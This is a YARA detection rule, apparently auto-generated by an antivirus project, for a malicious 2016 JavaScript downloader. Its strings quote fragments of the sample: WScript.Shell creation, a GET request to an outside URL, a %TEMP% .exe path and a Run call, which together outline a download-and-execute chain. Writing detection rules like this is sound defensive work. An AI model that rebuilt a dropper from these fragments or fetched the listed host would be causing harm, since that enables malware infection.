rule sig_20160330_9c85f44bc6f17aed545fad5423a77e5b {
  meta:
    description = "datamaliciousorder - file 20160330_9c85f44bc6f17aed545fad5423a77e5b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a76944f6f48d7cc49bcf13582f3f3590d78ecb4175a47361c7aaa8b66d8685e0"

  strings:
    $s1  = "function VL(X1, JB){X0 = X0 * 1; return X1 - JB;};" fullword ascii
    $s2  = "var Y = function A() {return WScript[AD](\"WScript\"+\".Shell\");}(), TI = 11;" fullword ascii
    $s3  = "VX0[A0](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s4  = "if (VX0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function B() {return Y[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JYW7I91Wxr3ov.ex\" + \"e\";};" fullword ascii
    $s6  = "function U(){return F + \"\";};" fullword ascii
    $s7  = "function AZ() {return ((TI0 == true) && (TI0 == R)) ? 1 : X0;};" fullword ascii
    $s8  = "function DP(C){Y[\"Run\"](C, X0, X0);};" fullword ascii
    $s9  = "function X()" fullword ascii
    $s10 = "}while (P);" fullword ascii
    $s11 = "function ZU(AA) {var WJ = (1, 2, 3, 4, 5, AA); return WJ;};" fullword ascii
    $s12 = "var DP0 = new this[\"Date\"]();" fullword ascii
    $s13 = "return VL(Z, RH);" fullword ascii
    $s14 = "function MD(){return 22;};" fullword ascii
    $s15 = "function GI(){return AD;};" fullword ascii
    $s16 = "var TI0 = false;" fullword ascii
    $s17 = "TI0 = true; " fullword ascii
    $s18 = "} catch(WB){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}